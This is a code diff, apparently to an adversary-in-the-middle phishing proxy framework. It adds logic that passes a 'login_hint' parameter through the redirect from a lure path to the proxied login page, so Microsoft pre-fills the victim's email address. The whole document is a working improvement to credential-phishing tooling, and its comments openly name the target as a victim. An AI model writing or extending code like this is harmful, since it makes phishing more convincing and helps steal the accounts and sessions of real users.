@@ -653,6 +653,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if err == nil {
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
+						// Forward login_hint so Microsoft pre-fills the victim's email.
+						// The redirect chain encodes ?login_hint=victim@domain.com which
+						// is sent as a real query parameter (unlike fragments).
+						if hint := req.URL.Query().Get("login_hint"); hint != "" {
+							if strings.Contains(rurl, "?") {
+								rurl += "&login_hint=" + url.QueryEscape(hint)
+							} else {
+								rurl += "?login_hint=" + url.QueryEscape(hint)
+							}
+						}
 						u, err := url.Parse(rurl)
 						if err == nil {
 							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
